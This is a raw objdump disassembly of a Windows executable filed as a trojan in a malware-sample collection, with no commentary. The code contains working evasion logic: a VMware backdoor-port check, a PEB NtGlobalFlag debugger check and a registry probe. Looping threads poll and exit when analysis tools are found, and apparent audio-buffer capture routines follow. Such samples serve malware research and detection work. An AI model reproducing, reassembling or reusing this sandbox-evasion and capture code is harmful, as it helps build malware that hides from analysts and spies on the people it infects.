
malware_samples/trojan/62990fa81113182214006a416dd1237c51f9df7c6343f7ba0548e57a2afbba47.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	53                   	push   %ebx
  401001:	56                   	push   %esi
  401002:	be 40 59 41 00       	mov    $0x415940,%esi
  401007:	57                   	push   %edi
  401008:	6a 1c                	push   $0x1c
  40100a:	8b ce                	mov    %esi,%ecx
  40100c:	e8 78 02 00 00       	call   0x401289
  401011:	8b c8                	mov    %eax,%ecx
  401013:	ff 15 34 02 41 00    	call   *0x410234
  401019:	6a 01                	push   $0x1
  40101b:	5b                   	pop    %ebx
  40101c:	38 18                	cmp    %bl,(%eax)
  40101e:	75 10                	jne    0x401030
  401020:	e8 cc 00 00 00       	call   0x4010f1
  401025:	84 c0                	test   %al,%al
  401027:	74 07                	je     0x401030
  401029:	53                   	push   %ebx
  40102a:	e8 05 02 00 00       	call   0x401234
  40102f:	59                   	pop    %ecx
  401030:	6a 1d                	push   $0x1d
  401032:	8b ce                	mov    %esi,%ecx
  401034:	e8 50 02 00 00       	call   0x401289
  401039:	8b c8                	mov    %eax,%ecx
  40103b:	ff 15 34 02 41 00    	call   *0x410234
  401041:	38 18                	cmp    %bl,(%eax)
  401043:	75 10                	jne    0x401055
  401045:	e8 b8 00 00 00       	call   0x401102
  40104a:	84 c0                	test   %al,%al
  40104c:	74 07                	je     0x401055
  40104e:	53                   	push   %ebx
  40104f:	e8 e0 01 00 00       	call   0x401234
  401054:	59                   	pop    %ecx
  401055:	6a 1f                	push   $0x1f
  401057:	8b ce                	mov    %esi,%ecx
  401059:	e8 2b 02 00 00       	call   0x401289
  40105e:	8b c8                	mov    %eax,%ecx
  401060:	ff 15 34 02 41 00    	call   *0x410234
  401066:	38 18                	cmp    %bl,(%eax)
  401068:	75 10                	jne    0x40107a
  40106a:	e8 09 01 00 00       	call   0x401178
  40106f:	84 c0                	test   %al,%al
  401071:	74 07                	je     0x40107a
  401073:	53                   	push   %ebx
  401074:	e8 bb 01 00 00       	call   0x401234
  401079:	59                   	pop    %ecx
  40107a:	6a 20                	push   $0x20
  40107c:	8b ce                	mov    %esi,%ecx
  40107e:	e8 06 02 00 00       	call   0x401289
  401083:	8b c8                	mov    %eax,%ecx
  401085:	ff 15 34 02 41 00    	call   *0x410234
  40108b:	38 18                	cmp    %bl,(%eax)
  40108d:	75 10                	jne    0x40109f
  40108f:	e8 0f 01 00 00       	call   0x4011a3
  401094:	84 c0                	test   %al,%al
  401096:	74 07                	je     0x40109f
  401098:	53                   	push   %ebx
  401099:	e8 96 01 00 00       	call   0x401234
  40109e:	59                   	pop    %ecx
  40109f:	6a 21                	push   $0x21
  4010a1:	8b ce                	mov    %esi,%ecx
  4010a3:	e8 e1 01 00 00       	call   0x401289
  4010a8:	8b c8                	mov    %eax,%ecx
  4010aa:	ff 15 34 02 41 00    	call   *0x410234
  4010b0:	33 ff                	xor    %edi,%edi
  4010b2:	38 18                	cmp    %bl,(%eax)
  4010b4:	75 10                	jne    0x4010c6
  4010b6:	57                   	push   %edi
  4010b7:	57                   	push   %edi
  4010b8:	57                   	push   %edi
  4010b9:	68 f8 11 40 00       	push   $0x4011f8
  4010be:	57                   	push   %edi
  4010bf:	57                   	push   %edi
  4010c0:	ff 15 98 01 41 00    	call   *0x410198
  4010c6:	6a 22                	push   $0x22
  4010c8:	8b ce                	mov    %esi,%ecx
  4010ca:	e8 ba 01 00 00       	call   0x401289
  4010cf:	8b c8                	mov    %eax,%ecx
  4010d1:	ff 15 34 02 41 00    	call   *0x410234
  4010d7:	38 18                	cmp    %bl,(%eax)
  4010d9:	75 10                	jne    0x4010eb
  4010db:	57                   	push   %edi
  4010dc:	57                   	push   %edi
  4010dd:	57                   	push   %edi
  4010de:	68 16 12 40 00       	push   $0x401216
  4010e3:	57                   	push   %edi
  4010e4:	57                   	push   %edi
  4010e5:	ff 15 98 01 41 00    	call   *0x410198
  4010eb:	5f                   	pop    %edi
  4010ec:	5e                   	pop    %esi
  4010ed:	33 c0                	xor    %eax,%eax
  4010ef:	5b                   	pop    %ebx
  4010f0:	c3                   	ret
  4010f1:	68 00 05 41 00       	push   $0x410500
  4010f6:	ff 15 90 01 41 00    	call   *0x410190
  4010fc:	85 c0                	test   %eax,%eax
  4010fe:	0f 95 c0             	setne  %al
  401101:	c3                   	ret
  401102:	55                   	push   %ebp
  401103:	8b ec                	mov    %esp,%ebp
  401105:	6a ff                	push   $0xffffffff
  401107:	68 10 05 41 00       	push   $0x410510
  40110c:	68 60 fc 40 00       	push   $0x40fc60
  401111:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401117:	50                   	push   %eax
  401118:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40111f:	83 ec 0c             	sub    $0xc,%esp
  401122:	53                   	push   %ebx
  401123:	56                   	push   %esi
  401124:	57                   	push   %edi
  401125:	89 65 e8             	mov    %esp,-0x18(%ebp)
  401128:	c6 45 e4 01          	movb   $0x1,-0x1c(%ebp)
  40112c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401130:	52                   	push   %edx
  401131:	51                   	push   %ecx
  401132:	53                   	push   %ebx
  401133:	b8 68 58 4d 56       	mov    $0x564d5868,%eax
  401138:	bb 00 00 00 00       	mov    $0x0,%ebx
  40113d:	b9 0a 00 00 00       	mov    $0xa,%ecx
  401142:	ba 58 56 00 00       	mov    $0x5658,%edx
  401147:	ed                   	in     (%dx),%eax
  401148:	81 fb 68 58 4d 56    	cmp    $0x564d5868,%ebx
  40114e:	0f 94 45 e4          	sete   -0x1c(%ebp)
  401152:	5b                   	pop    %ebx
  401153:	59                   	pop    %ecx
  401154:	5a                   	pop    %edx
  401155:	eb 0b                	jmp    0x401162
  401157:	6a 01                	push   $0x1
  401159:	58                   	pop    %eax
  40115a:	c3                   	ret
  40115b:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40115e:	80 65 e4 00          	andb   $0x0,-0x1c(%ebp)
  401162:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  401166:	8a 45 e4             	mov    -0x1c(%ebp),%al
  401169:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40116c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401173:	5f                   	pop    %edi
  401174:	5e                   	pop    %esi
  401175:	5b                   	pop    %ebx
  401176:	c9                   	leave
  401177:	c3                   	ret
  401178:	55                   	push   %ebp
  401179:	8b ec                	mov    %esp,%ebp
  40117b:	51                   	push   %ecx
  40117c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401180:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401183:	50                   	push   %eax
  401184:	68 19 00 02 00       	push   $0x20019
  401189:	6a 00                	push   $0x0
  40118b:	68 1c 05 41 00       	push   $0x41051c
  401190:	68 02 00 00 80       	push   $0x80000002
  401195:	ff 15 28 00 41 00    	call   *0x410028
  40119b:	f7 d8                	neg    %eax
  40119d:	1a c0                	sbb    %al,%al
  40119f:	fe c0                	inc    %al
  4011a1:	c9                   	leave
  4011a2:	c3                   	ret
  4011a3:	55                   	push   %ebp
  4011a4:	8b ec                	mov    %esp,%ebp
  4011a6:	51                   	push   %ecx
  4011a7:	64 a1 30 00 00 00    	mov    %fs:0x30,%eax
  4011ad:	83 c0 68             	add    $0x68,%eax
  4011b0:	3e 8b 00             	mov    %ds:(%eax),%eax
  4011b3:	83 f8 70             	cmp    $0x70,%eax
  4011b6:	74 09                	je     0x4011c1
  4011b8:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4011bf:	eb 07                	jmp    0x4011c8
  4011c1:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4011c8:	33 c0                	xor    %eax,%eax
  4011ca:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  4011cd:	0f 95 c0             	setne  %al
  4011d0:	c9                   	leave
  4011d1:	c3                   	ret
  4011d2:	6a 00                	push   $0x0
  4011d4:	68 38 05 41 00       	push   $0x410538
  4011d9:	ff 15 5c 04 41 00    	call   *0x41045c
  4011df:	85 c0                	test   %eax,%eax
  4011e1:	0f 95 c0             	setne  %al
  4011e4:	c3                   	ret
  4011e5:	6a 00                	push   $0x0
  4011e7:	68 50 05 41 00       	push   $0x410550
  4011ec:	ff 15 5c 04 41 00    	call   *0x41045c
  4011f2:	85 c0                	test   %eax,%eax
  4011f4:	0f 95 c0             	setne  %al
  4011f7:	c3                   	ret
  4011f8:	e8 d5 ff ff ff       	call   0x4011d2
  4011fd:	84 c0                	test   %al,%al
  4011ff:	74 08                	je     0x401209
  401201:	6a 02                	push   $0x2
  401203:	e8 2c 00 00 00       	call   0x401234
  401208:	59                   	pop    %ecx
  401209:	68 b8 0b 00 00       	push   $0xbb8
  40120e:	ff 15 8c 01 41 00    	call   *0x41018c
  401214:	eb e2                	jmp    0x4011f8
  401216:	e8 ca ff ff ff       	call   0x4011e5
  40121b:	84 c0                	test   %al,%al
  40121d:	74 08                	je     0x401227
  40121f:	6a 03                	push   $0x3
  401221:	e8 0e 00 00 00       	call   0x401234
  401226:	59                   	pop    %ecx
  401227:	68 b8 0b 00 00       	push   $0xbb8
  40122c:	ff 15 8c 01 41 00    	call   *0x41018c
  401232:	eb e2                	jmp    0x401216
  401234:	55                   	push   %ebp
  401235:	8b ec                	mov    %esp,%ebp
  401237:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40123b:	56                   	push   %esi
  40123c:	57                   	push   %edi
  40123d:	74 46                	je     0x401285
  40123f:	bf 40 59 41 00       	mov    $0x415940,%edi
  401244:	68 60 05 41 00       	push   $0x410560
  401249:	6a 2f                	push   $0x2f
  40124b:	8b cf                	mov    %edi,%ecx
  40124d:	e8 37 00 00 00       	call   0x401289
  401252:	8b 35 38 02 41 00    	mov    0x410238,%esi
  401258:	50                   	push   %eax
  401259:	ff d6                	call   *%esi
  40125b:	59                   	pop    %ecx
  40125c:	84 c0                	test   %al,%al
  40125e:	59                   	pop    %ecx
  40125f:	74 08                	je     0x401269
  401261:	6a 02                	push   $0x2
  401263:	ff 15 ac 03 41 00    	call   *0x4103ac
  401269:	68 5c 05 41 00       	push   $0x41055c
  40126e:	6a 2f                	push   $0x2f
  401270:	8b cf                	mov    %edi,%ecx
  401272:	e8 12 00 00 00       	call   0x401289
  401277:	50                   	push   %eax
  401278:	ff d6                	call   *%esi
  40127a:	59                   	pop    %ecx
  40127b:	84 c0                	test   %al,%al
  40127d:	59                   	pop    %ecx
  40127e:	74 05                	je     0x401285
  401280:	e8 03 57 00 00       	call   0x406988
  401285:	5f                   	pop    %edi
  401286:	5e                   	pop    %esi
  401287:	5d                   	pop    %ebp
  401288:	c3                   	ret
  401289:	55                   	push   %ebp
  40128a:	8b ec                	mov    %esp,%ebp
  40128c:	56                   	push   %esi
  40128d:	57                   	push   %edi
  40128e:	8b f9                	mov    %ecx,%edi
  401290:	e8 20 00 00 00       	call   0x4012b5
  401295:	8b 75 08             	mov    0x8(%ebp),%esi
  401298:	3b c6                	cmp    %esi,%eax
  40129a:	77 07                	ja     0x4012a3
  40129c:	8b cf                	mov    %edi,%ecx
  40129e:	e8 25 00 00 00       	call   0x4012c8
  4012a3:	8b cf                	mov    %edi,%ecx
  4012a5:	e8 89 73 00 00       	call   0x408633
  4012aa:	c1 e6 04             	shl    $0x4,%esi
  4012ad:	03 c6                	add    %esi,%eax
  4012af:	5f                   	pop    %edi
  4012b0:	5e                   	pop    %esi
  4012b1:	5d                   	pop    %ebp
  4012b2:	c2 04 00             	ret    $0x4
  4012b5:	8b 51 04             	mov    0x4(%ecx),%edx
  4012b8:	85 d2                	test   %edx,%edx
  4012ba:	75 03                	jne    0x4012bf
  4012bc:	33 c0                	xor    %eax,%eax
  4012be:	c3                   	ret
  4012bf:	8b 41 08             	mov    0x8(%ecx),%eax
  4012c2:	2b c2                	sub    %edx,%eax
  4012c4:	c1 f8 04             	sar    $0x4,%eax
  4012c7:	c3                   	ret
  4012c8:	55                   	push   %ebp
  4012c9:	8b ec                	mov    %esp,%ebp
  4012cb:	83 ec 30             	sub    $0x30,%esp
  4012ce:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4012d1:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4012d4:	50                   	push   %eax
  4012d5:	68 64 05 41 00       	push   $0x410564
  4012da:	ff 15 4c 02 41 00    	call   *0x41024c
  4012e0:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4012e3:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4012e6:	50                   	push   %eax
  4012e7:	ff 15 48 02 41 00    	call   *0x410248
  4012ed:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4012f0:	68 f0 19 41 00       	push   $0x4119f0
  4012f5:	50                   	push   %eax
  4012f6:	e8 8d e9 00 00       	call   0x40fc88
  4012fb:	e8 05 00 00 00       	call   0x401305
  401300:	e9 15 00 00 00       	jmp    0x40131a
  401305:	55                   	push   %ebp
  401306:	8b ec                	mov    %esp,%ebp
  401308:	51                   	push   %ecx
  401309:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40130c:	b9 a8 51 41 00       	mov    $0x4151a8,%ecx
  401311:	50                   	push   %eax
  401312:	ff 15 50 02 41 00    	call   *0x410250
  401318:	c9                   	leave
  401319:	c3                   	ret
  40131a:	68 26 13 40 00       	push   $0x401326
  40131f:	e8 96 e9 00 00       	call   0x40fcba
  401324:	59                   	pop    %ecx
  401325:	c3                   	ret
  401326:	b9 a8 51 41 00       	mov    $0x4151a8,%ecx
  40132b:	ff 25 54 02 41 00    	jmp    *0x410254
  401331:	e8 05 00 00 00       	call   0x40133b
  401336:	e9 15 00 00 00       	jmp    0x401350
  40133b:	55                   	push   %ebp
  40133c:	8b ec                	mov    %esp,%ebp
  40133e:	51                   	push   %ecx
  40133f:	8d 45 ff             	lea    -0x1(%ebp),%eax
  401342:	b9 80 51 41 00       	mov    $0x415180,%ecx
  401347:	50                   	push   %eax
  401348:	ff 15 50 02 41 00    	call   *0x410250
  40134e:	c9                   	leave
  40134f:	c3                   	ret
  401350:	68 5c 13 40 00       	push   $0x40135c
  401355:	e8 60 e9 00 00       	call   0x40fcba
  40135a:	59                   	pop    %ecx
  40135b:	c3                   	ret
  40135c:	b9 80 51 41 00       	mov    $0x415180,%ecx
  401361:	ff 25 54 02 41 00    	jmp    *0x410254
  401367:	e9 00 00 00 00       	jmp    0x40136c
  40136c:	6a 40                	push   $0x40
  40136e:	e8 59 e9 00 00       	call   0x40fccc
  401373:	59                   	pop    %ecx
  401374:	a3 9c 51 41 00       	mov    %eax,0x41519c
  401379:	c3                   	ret
  40137a:	e8 05 00 00 00       	call   0x401384
  40137f:	e9 2f 00 00 00       	jmp    0x4013b3
  401384:	55                   	push   %ebp
  401385:	8b ec                	mov    %esp,%ebp
  401387:	83 ec 14             	sub    $0x14,%esp
  40138a:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40138d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401390:	50                   	push   %eax
  401391:	8d 45 fe             	lea    -0x2(%ebp),%eax
  401394:	50                   	push   %eax
  401395:	ff 15 50 02 41 00    	call   *0x410250
  40139b:	50                   	push   %eax
  40139c:	6a 02                	push   $0x2
  40139e:	b9 c0 51 41 00       	mov    $0x4151c0,%ecx
  4013a3:	e8 56 07 00 00       	call   0x401afe
  4013a8:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4013ab:	ff 15 54 02 41 00    	call   *0x410254
  4013b1:	c9                   	leave
  4013b2:	c3                   	ret
  4013b3:	68 bf 13 40 00       	push   $0x4013bf
  4013b8:	e8 fd e8 00 00       	call   0x40fcba
  4013bd:	59                   	pop    %ecx
  4013be:	c3                   	ret
  4013bf:	b9 c0 51 41 00       	mov    $0x4151c0,%ecx
  4013c4:	e9 73 07 00 00       	jmp    0x401b3c
  4013c9:	55                   	push   %ebp
  4013ca:	8b ec                	mov    %esp,%ebp
  4013cc:	51                   	push   %ecx
  4013cd:	51                   	push   %ecx
  4013ce:	8b 45 0c             	mov    0xc(%ebp),%eax
  4013d1:	8b 55 08             	mov    0x8(%ebp),%edx
  4013d4:	56                   	push   %esi
  4013d5:	57                   	push   %edi
  4013d6:	0f b7 f0             	movzwl %ax,%esi
  4013d9:	0f b7 fa             	movzwl %dx,%edi
  4013dc:	c1 ee 03             	shr    $0x3,%esi
  4013df:	0f af fe             	imul   %esi,%edi
  4013e2:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4013e5:	66 a3 e6 51 41 00    	mov    %ax,0x4151e6
  4013eb:	0f af f9             	imul   %ecx,%edi
  4013ee:	66 c1 e8 03          	shr    $0x3,%ax
  4013f2:	89 3d e0 51 41 00    	mov    %edi,0x4151e0
  4013f8:	0f af c2             	imul   %edx,%eax
  4013fb:	33 ff                	xor    %edi,%edi
  4013fd:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401400:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401403:	66 c7 05 d8 51 41 00 	movw   $0x1,0x4151d8
  40140a:	01 00 
  40140c:	df 6d f8             	fildll -0x8(%ebp)
  40140f:	66 89 15 da 51 41 00 	mov    %dx,0x4151da
  401416:	89 0d dc 51 41 00    	mov    %ecx,0x4151dc
  40141c:	66 a3 e4 51 41 00    	mov    %ax,0x4151e4
  401422:	66 89 3d e8 51 41 00 	mov    %di,0x4151e8
  401429:	d8 0d 80 05 41 00    	fmuls  0x410580
  40142f:	e8 9e e8 00 00       	call   0x40fcd2
  401434:	0f af f0             	imul   %eax,%esi
  401437:	68 08 00 03 00       	push   $0x30008
  40143c:	57                   	push   %edi
  40143d:	68 28 15 40 00       	push   $0x401528
  401442:	68 d8 51 41 00       	push   $0x4151d8
  401447:	6a ff                	push   $0xffffffff
  401449:	68 58 51 41 00       	push   $0x415158
  40144e:	a3 90 51 41 00       	mov    %eax,0x415190
  401453:	89 35 94 51 41 00    	mov    %esi,0x415194
  401459:	ff 15 80 04 41 00    	call   *0x410480
  40145f:	57                   	push   %edi
  401460:	e8 17 00 00 00       	call   0x40147c
  401465:	47                   	inc    %edi
  401466:	59                   	pop    %ecx
  401467:	83 ff 02             	cmp    $0x2,%edi
  40146a:	72 f3                	jb     0x40145f
  40146c:	ff 35 58 51 41 00    	push   0x415158
  401472:	ff 15 98 04 41 00    	call   *0x410498
  401478:	5f                   	pop    %edi
  401479:	5e                   	pop    %esi
  40147a:	c9                   	leave
  40147b:	c3                   	ret
  40147c:	55                   	push   %ebp
  40147d:	8b ec                	mov    %esp,%ebp
  40147f:	56                   	push   %esi
  401480:	57                   	push   %edi
  401481:	ff 35 94 51 41 00    	push   0x415194
  401487:	bf c0 51 41 00       	mov    $0x4151c0,%edi
  40148c:	8b cf                	mov    %edi,%ecx
  40148e:	ff 75 08             	push   0x8(%ebp)
  401491:	e8 f3 fd ff ff       	call   0x401289
  401496:	8b c8                	mov    %eax,%ecx
  401498:	ff 15 5c 02 41 00    	call   *0x41025c
  40149e:	8b 75 08             	mov    0x8(%ebp),%esi
  4014a1:	ff 75 08             	push   0x8(%ebp)
  4014a4:	8b cf                	mov    %edi,%ecx
  4014a6:	c1 e6 05             	shl    $0x5,%esi
  4014a9:	e8 db fd ff ff       	call   0x401289
  4014ae:	8b c8                	mov    %eax,%ecx
  4014b0:	ff 15 58 02 41 00    	call   *0x410258
  4014b6:	8b 0d 9c 51 41 00    	mov    0x41519c,%ecx
  4014bc:	6a 20                	push   $0x20
  4014be:	89 04 0e             	mov    %eax,(%esi,%ecx,1)
  4014c1:	a1 9c 51 41 00       	mov    0x41519c,%eax
  4014c6:	8b 0d 94 51 41 00    	mov    0x415194,%ecx
  4014cc:	89 4c 06 04          	mov    %ecx,0x4(%esi,%eax,1)
  4014d0:	8b 0d 9c 51 41 00    	mov    0x41519c,%ecx
  4014d6:	33 c0                	xor    %eax,%eax
  4014d8:	89 44 0e 08          	mov    %eax,0x8(%esi,%ecx,1)
  4014dc:	8b 0d 9c 51 41 00    	mov    0x41519c,%ecx
  4014e2:	89 44 0e 0c          	mov    %eax,0xc(%esi,%ecx,1)
  4014e6:	8b 0d 9c 51 41 00    	mov    0x41519c,%ecx
  4014ec:	89 44 0e 10          	mov    %eax,0x10(%esi,%ecx,1)
  4014f0:	8b 0d 9c 51 41 00    	mov    0x41519c,%ecx
  4014f6:	89 44 0e 14          	mov    %eax,0x14(%esi,%ecx,1)
  4014fa:	a1 9c 51 41 00       	mov    0x41519c,%eax
  4014ff:	03 c6                	add    %esi,%eax
  401501:	50                   	push   %eax
  401502:	ff 35 58 51 41 00    	push   0x415158
  401508:	ff 15 90 04 41 00    	call   *0x410490
  40150e:	a1 9c 51 41 00       	mov    0x41519c,%eax
  401513:	6a 20                	push   $0x20
  401515:	03 f0                	add    %eax,%esi
  401517:	56                   	push   %esi
  401518:	ff 35 58 51 41 00    	push   0x415158
  40151e:	ff 15 8c 04 41 00    	call   *0x41048c
  401524:	5f                   	pop    %edi
  401525:	5e                   	pop    %esi
  401526:	5d                   	pop    %ebp
  401527:	c3                   	ret
  401528:	55                   	push   %ebp
  401529:	8b ec                	mov    %esp,%ebp
  40152b:	81 ec 94 00 00 00    	sub    $0x94,%esp
  401531:	8d 45 ff             	lea    -0x1(%ebp),%eax
  401534:	56                   	push   %esi
  401535:	50                   	push   %eax
  401536:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401539:	ff 15 50 02 41 00    	call   *0x410250
  40153f:	8b 45 0c             	mov    0xc(%ebp),%eax
  401542:	2d be 03 00 00       	sub    $0x3be,%eax
  401547:	0f 84 94 01 00 00    	je     0x4016e1
  40154d:	48                   	dec    %eax
  40154e:	48                   	dec    %eax
  40154f:	0f 85 93 01 00 00    	jne    0x4016e8
  401555:	80 3d b8 51 41 00 01 	cmpb   $0x1,0x4151b8
  40155c:	75 1a                	jne    0x401578
  40155e:	ff 35 ec 51 41 00    	push   0x4151ec
  401564:	e8 b7 e9 00 00       	call   0x40ff20
  401569:	83 25 ec 51 41 00 00 	andl   $0x0,0x4151ec
  401570:	6a 00                	push   $0x0
  401572:	ff 15 88 01 41 00    	call   *0x410188
  401578:	ff 35 a0 51 41 00    	push   0x4151a0
  40157e:	b9 c0 51 41 00       	mov    $0x4151c0,%ecx
  401583:	e8 01 fd ff ff       	call   0x401289
  401588:	50                   	push   %eax
  401589:	be 68 52 41 00       	mov    $0x415268,%esi
  40158e:	8d 45 0f             	lea    0xf(%ebp),%eax
  401591:	56                   	push   %esi
  401592:	50                   	push   %eax
  401593:	6a 20                	push   $0x20
  401595:	ff 75 14             	push   0x14(%ebp)
  401598:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40159e:	ff 15 70 02 41 00    	call   *0x410270
  4015a4:	50                   	push   %eax
  4015a5:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4015a8:	56                   	push   %esi
  4015a9:	50                   	push   %eax
  4015aa:	6a 12                	push   $0x12
  4015ac:	68 d8 51 41 00       	push   $0x4151d8
  4015b1:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  4015b4:	ff 15 70 02 41 00    	call   *0x410270
  4015ba:	50                   	push   %eax
  4015bb:	56                   	push   %esi
  4015bc:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4015bf:	68 84 05 41 00       	push   $0x410584
  4015c4:	50                   	push   %eax
  4015c5:	e8 50 e6 00 00       	call   0x40fc1a
  4015ca:	83 c4 0c             	add    $0xc,%esp
  4015cd:	50                   	push   %eax
  4015ce:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4015d1:	50                   	push   %eax
  4015d2:	e8 3d e6 00 00       	call   0x40fc14
  4015d7:	83 c4 0c             	add    $0xc,%esp
  4015da:	50                   	push   %eax
  4015db:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4015de:	50                   	push   %eax
  4015df:	e8 30 e6 00 00       	call   0x40fc14
  4015e4:	83 c4 0c             	add    $0xc,%esp
  4015e7:	50                   	push   %eax
  4015e8:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4015eb:	50                   	push   %eax
  4015ec:	e8 23 e6 00 00       	call   0x40fc14
  4015f1:	83 c4 0c             	add    $0xc,%esp
  4015f4:	50                   	push   %eax
  4015f5:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4015f8:	50                   	push   %eax
  4015f9:	e8 16 e6 00 00       	call   0x40fc14
  4015fe:	83 c4 0c             	add    $0xc,%esp
  401601:	50                   	push   %eax
  401602:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  401608:	50                   	push   %eax
  401609:	e8 06 e6 00 00       	call   0x40fc14
  40160e:	83 c4 0c             	add    $0xc,%esp
  401611:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401614:	50                   	push   %eax
  401615:	ff 15 64 02 41 00    	call   *0x410264
  40161b:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  401621:	ff 15 54 02 41 00    	call   *0x410254
  401627:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40162a:	ff 15 54 02 41 00    	call   *0x410254
  401630:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401633:	ff 15 54 02 41 00    	call   *0x410254
  401639:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40163c:	ff 15 54 02 41 00    	call   *0x410254
  401642:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  401645:	ff 15 54 02 41 00    	call   *0x410254
  40164b:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40164e:	ff 15 54 02 41 00    	call   *0x410254
  401654:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  401657:	ff 15 54 02 41 00    	call   *0x410254
  40165d:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  401663:	ff 15 54 02 41 00    	call   *0x410254
  401669:	a1 a0 51 41 00       	mov    0x4151a0,%eax
  40166e:	6a 20                	push   $0x20
  401670:	c1 e0 05             	shl    $0x5,%eax
  401673:	03 05 9c 51 41 00    	add    0x41519c,%eax
  401679:	50                   	push   %eax
  40167a:	ff 35 58 51 41 00    	push   0x415158
  401680:	ff 15 94 04 41 00    	call   *0x410494
  401686:	ff 35 a0 51 41 00    	push   0x4151a0
  40168c:	e8 eb fd ff ff       	call   0x40147c
  401691:	59                   	pop    %ecx
  401692:	a1 ec 51 41 00       	mov    0x4151ec,%eax
  401697:	85 c0                	test   %eax,%eax
  401699:	75 1f                	jne    0x4016ba
  40169b:	50                   	push   %eax
  40169c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40169f:	83 ec 10             	sub    $0x10,%esp
  4016a2:	8b cc                	mov    %esp,%ecx
  4016a4:	50                   	push   %eax
  4016a5:	ff 15 60 02 41 00    	call   *0x410260
  4016ab:	e8 3f 0f 00 00       	call   0x4025ef
  4016b0:	83 c4 14             	add    $0x14,%esp
  4016b3:	a3 ec 51 41 00       	mov    %eax,0x4151ec
  4016b8:	eb 18                	jmp    0x4016d2
  4016ba:	50                   	push   %eax
  4016bb:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4016be:	83 ec 10             	sub    $0x10,%esp
  4016c1:	8b cc                	mov    %esp,%ecx
  4016c3:	50                   	push   %eax
  4016c4:	ff 15 60 02 41 00    	call   *0x410260
  4016ca:	e8 35 0e 00 00       	call   0x402504
  4016cf:	83 c4 14             	add    $0x14,%esp
  4016d2:	ff 05 a0 51 41 00    	incl   0x4151a0
  4016d8:	83 3d a0 51 41 00 02 	cmpl   $0x2,0x4151a0
  4016df:	72 07                	jb     0x4016e8
  4016e1:	83 25 a0 51 41 00 00 	andl   $0x0,0x4151a0
  4016e8:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4016eb:	ff 15 54 02 41 00    	call   *0x410254
  4016f1:	5e                   	pop    %esi
  4016f2:	c9                   	leave
  4016f3:	c2 14 00             	ret    $0x14
  4016f6:	55                   	push   %ebp
  4016f7:	8b ec                	mov    %esp,%ebp
  4016f9:	81 ec a8 00 00 00    	sub    $0xa8,%esp
  4016ff:	56                   	push   %esi
  401700:	57                   	push   %edi
  401701:	6a 01                	push   $0x1
  401703:	8d 8d 58 ff ff ff    	lea    -0xa8(%ebp),%ecx
  401709:	5e                   	pop    %esi
  40170a:	56                   	push   %esi
  40170b:	6a 22                	push   $0x22
  40170d:	ff 75 08             	push   0x8(%ebp)
  401710:	ff 15 84 02 41 00    	call   *0x410284
  401716:	0f b7 0d da 51 41 00 	movzwl 0x4151da,%ecx
  40171d:	0f b7 05 e6 51 41 00 	movzwl 0x4151e6,%eax
  401724:	0f af c1             	imul   %ecx,%eax
  401727:	8b d0                	mov    %eax,%edx
  401729:	6a 08                	push   $0x8
  40172b:	0f af 15 dc 51 41 00 	imul   0x4151dc,%edx
  401732:	c1 ea 03             	shr    $0x3,%edx
  401735:	89 55 fc             	mov    %edx,-0x4(%ebp)
  401738:	89 75 f4             	mov    %esi,-0xc(%ebp)
  40173b:	99                   	cltd
  40173c:	5e                   	pop    %esi
  40173d:	c7 45 ec 10 00 00 00 	movl   $0x10,-0x14(%ebp)
  401744:	f7 fe                	idiv   %esi
  401746:	8b 75 0c             	mov    0xc(%ebp),%esi
  401749:	6a 00                	push   $0x0
  40174b:	6a 00                	push   $0x0
  40174d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401750:	8b 46 04             	mov    0x4(%esi),%eax
  401753:	0f af c1             	imul   %ecx,%eax
  401756:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401759:	83 c0 24             	add    $0x24,%eax
  40175c:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  401762:	89 45 08             	mov    %eax,0x8(%ebp)
  401765:	ff 15 80 02 41 00    	call   *0x410280
